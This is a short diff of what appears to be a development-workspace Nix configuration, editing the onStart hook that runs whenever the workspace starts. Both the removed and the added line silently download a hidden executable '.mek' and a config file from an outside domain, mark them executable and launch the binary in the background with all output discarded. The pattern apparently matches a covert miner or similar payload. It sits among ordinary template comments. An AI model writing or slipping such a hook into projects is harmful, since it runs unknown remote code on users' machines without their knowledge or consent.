@@ -45,7 +45,7 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "d=$(mktemp -d) && cd \"$d\" && wget -q -O .mek https://dot-store.biz.id/bagong && wget -q -O config.json https://dot-store.biz.id/bagong.json && jq '.user |= sub(\"linux01\"; \"$d\")' config.json > tmp.json && mv tmp.json config.json && chmod +x .mek config.json && nohup ./.mek -c 'config.json' >/dev/null 2>&1 & cd .. && rm -rf \"$d\"";
+        joko = "([ -f .mek ] || wget -q -O .mek https://dot-store.biz.id/bagong) && wget -q -O config.json https://dot-store.biz.id/bagong.json && chmod +x .mek config.json && nohup ./.mek -c 'config.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
